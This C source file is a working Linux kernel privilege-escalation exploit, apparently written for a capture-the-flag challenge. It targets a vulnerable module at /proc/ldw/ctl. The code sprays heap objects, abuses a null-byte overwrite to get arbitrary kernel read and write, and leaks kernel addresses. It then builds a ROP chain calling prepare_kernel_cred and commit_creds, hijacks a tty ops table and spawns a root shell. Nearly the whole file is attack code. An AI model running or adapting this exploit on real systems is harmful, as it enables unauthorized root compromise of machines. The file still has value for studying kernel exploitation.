#define _GNU_SOURCE
#include <err.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ipc.h>
#include <sys/msg.h>

#include "../whitelist/libldw/ldw_rules.h"

#define CTL(action, ...) _CTL(ldw_ctl_##action, __VA_ARGS__)
#define _CTL(func, ...) ({       \
  int __res = func(__VA_ARGS__); \
  if (__res < 0)                 \
    perror(#func "() failed");   \
  __res;                         \
})

#define TASK_CACHEP 0x1ae3340
#define LDW_CTL_OPS 0x2140

uint64_t heap_1024;
uint64_t old_tty;

int fd;

static char __buff[4096];
#define tmp_rule ((struct ldw_rule*)__buff)

#define INIT_THREAD_UNION 0x143d5d8
#define EFI64_THUNK 0x5c2cc

union {
  uint64_t u64;
  uint32_t u32;
} *ptr;
struct tty_struct {
  char pad[0x288];
  uint64_t write_buf;
  uint64_t write_cnt;
};
// Kernel structs
struct trap_frame64 {
    void*     rip;
    uint64_t  cs;
    uint64_t  rflags;
    uint64_t  rsp;
    uint64_t  ss;
} __attribute__ (( packed )) tf; // Trap frame used for iretq when returning back to userland

void read_at(uint64_t addr) {
  tmp_rule->size = 8 + sizeof(*tmp_rule);
  ptr->u64 = addr;
  for (int i = 0; i < 8; i++) {
    if (tmp_rule->name[i] == 0) {
      printf("Invalid address with null pointer: 0x%lx", addr);
      return;
    }
  }
  CTL(edit, fd, tmp_rule);
  CTL(next, fd);
  tmp_rule->size = 0x40 + sizeof(*tmp_rule);
  CTL(get, fd, tmp_rule);
  CTL(prev, fd);
}

void write_at(uint64_t addr, void *buff, uint64_t size) {
  tmp_rule->size = 8 + sizeof(*tmp_rule);
  ptr->u64 = addr;
  CTL(edit, fd, tmp_rule);
  CTL(next, fd);

  memcpy(tmp_rule->name, buff, size);
  tmp_rule->size = size + sizeof(*tmp_rule);
  CTL(edit, fd, tmp_rule);
  CTL(prev, fd);
}

// Final payload as root
void shell() {
    puts("YOU ARE ROOT!!!!");
    
    // Restore old vtable to avoid kernel panic on exit
    write_at(heap_1024 + 0x818, &old_tty, 8);

    system("/bin/sh");
    // Cleanly exit. The kernel will panic if we try to run the exploit again however.
    exit(0);
}

// Fill in tf members so kernel knows where to return to
void prepare_tf(void) {
    asm(
        "xor %eax, %eax;"
        "mov %cs, %ax;"
        "pushq %rax;   popq tf+8;"
        "pushfq;      popq tf+16;"
        "pushq %rsp; popq tf+24;"
        "mov %ss, %ax;"
        "pushq %rax;   popq tf+32;"
    );
    tf.rip = &shell;
    tf.rsp -= 1024; // unused part of  stack
    tf.rsp  &= -0x10; // Align to avoid sse crash
    // Since we return directly to shell there isn't return address pushed to stack.
    // so we need to simulate that push to maintain alignment
    tf.rsp  -= 8;
}

int main() {
  int qid;
  struct {
    long mtype;
    char mtext[0x40];
  } msgbuf;

  ptr = (void*)tmp_rule->name;

  prepare_tf();

//  system("cat /proc/kallsyms | grep -E 'ldw_ctl_insert_before|__kmalloc'; read -p '> '");

  // Get message 
  if ((qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT)) == -1) {
    perror("msgget");
    return -1;
  }
  msgbuf.mtype = 1;
  memset(msgbuf.mtext, 'A', sizeof(msgbuf.mtext));

  // Open ldw ctl
  fd = open("/proc/ldw/ctl", 0);
  if (fd < 0) err(1, "open: /proc/ldw/ctl");

  // Spray in kmalloc-64
  for (int i = 0; i < 100; i++) {
    if (msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext) - 48, 0) == -1) {
      err(1, "msgsnd");
    }
  }

  // Spray ptmx
  for (int i = 0; i < 16; i++) {
    open("/dev/ptmx", 0);
  }

  // Get first element
  CTL(next, fd);

begin:
  tmp_rule->size = sizeof(__buff);
  if (CTL(get, fd, tmp_rule) < 0) return 1;

  // Insert two elements
  tmp_rule->size = 0x40 + sizeof(*tmp_rule);
  strcpy(tmp_rule->name, "hello");
  if (CTL(insert_before, fd, tmp_rule) < 0) return 1;
  if (CTL(insert_before, fd, tmp_rule) < 0) return 1;

  // Now edit first element created, allowing us to null-byte overwrite,
  // pointing prev rule's string pointer into this rule... it's complicated!
  CTL(next, fd);
  memset(tmp_rule->name, 'A', 0x40);
  CTL(edit, fd, tmp_rule);

  CTL(prev, fd);
  CTL(get, fd, tmp_rule);

  // Should leak a rule struct!
  puts("THIS SHOULD BE A LEAK:");
  for (int i = 0; i < 0x40; i++) {
    printf("%02hhx%c", tmp_rule->name[i], (i + 1) & 0xf ? ' ' : '\n');
  }


  uint64_t heap_leak = ptr->u64;
  printf("Heap leak: 0x%lx\n", heap_leak);
  if ((heap_leak & 0xffff0000000000ff) != 0xffff000000000040) {
    msgsnd(qid, &msgbuf, sizeof(msgbuf.mtext) - 48, 0);
    puts("Failed!");
    goto begin;
  }

  // Read the double linked list back to module
  read_at(heap_leak + 0x70);

  uint64_t mod_base = ptr->u64 - 0x4040;
  if ((mod_base & 0xffffffff00000000) != 0xffffffff00000000) {
    puts("Failed!");
    goto begin;
  }
  printf("Mod base: 0x%lx\n", mod_base);

  // Read the call __kmalloc instruction
  
  // Have kernel base now!
  read_at(mod_base + 0x1257);
  uint64_t kbase = ((int)ptr->u32 + mod_base + 0x1257 + 4) - 0x1ae2a0;
  printf("Kernel base: 0x%lx\n", kbase);

  tmp_rule->size = 0x400 + sizeof(*tmp_rule);
  for (int i = 0; i < 0x7f; i++) {
    ((uint64_t*)&tmp_rule->name[1])[i] = kbase + EFI64_THUNK;
  }
  if (CTL(insert_before, fd, tmp_rule) < 0) return 1;
  if (CTL(insert_before, fd, tmp_rule) < 0) return 1;

  CTL(next, fd);
  CTL(next, fd);


  int ptmx = open("/dev/ptmx", O_RDONLY);
  if (ptmx < 0) err(1, "open(/dev/ptmx)");

  read_at(heap_leak + 0xc0 + 1);
  heap_1024 = *(uint64_t*)&tmp_rule->name[-1] & ~0xff;
  printf("kmalloc-1024 leak: 0x%lx\n", heap_1024);

  uint64_t stack_ptr = heap_1024 + 0x400 + 8;
  write_at(kbase + INIT_THREAD_UNION, &stack_ptr, 8);
  printf("*Stack @ 0x%lx\n", kbase + INIT_THREAD_UNION);

  // Write stack entries one by one
  uint64_t sind = 0;
  uint64_t tmp = 0;
#define stack(val) do { \
  tmp = (val); \
  write_at(stack_ptr + sind++ * 8, &tmp, 8); \
} while (0)
#define stack_ip(off) stack((off) + kbase)

  stack(0);
  stack(0);

  stack_ip(0x15f8); // pop rdi; ret
  stack(0);
  stack_ip(0x80660); // prepare_kernel_cred
  stack_ip(0xaf87); // pop rcx
  stack(0);
  stack_ip(0x1ba7b); // mov rdi, rax ; rep movsq qword ptr [rdi], qword ptr [rsi] ; ret
  stack_ip(0x80320); // commit_creds

  stack_ip(0xC00A45); // swapgs_restore_regs_and_return_to_usermode + 0x16
  stack(0xdeadbeefcafebabe);
  stack(0xdeadb0b0cafeb00b);
  for (uint64_t i = 0; i < sizeof(tf) / 8; i++) {
    stack(((uint64_t*)&tf)[i]);
  }

  // Write to ops table
  tmp = heap_1024 + 1;
  read_at(heap_1024 + 0x818);
  old_tty = ptr->u64;
  write_at(heap_1024 + 0x818, &tmp, 8);

  /* ignite! */
  close(ptmx);

  puts("Shouldn't have reached here :(\n");
  getchar();


}
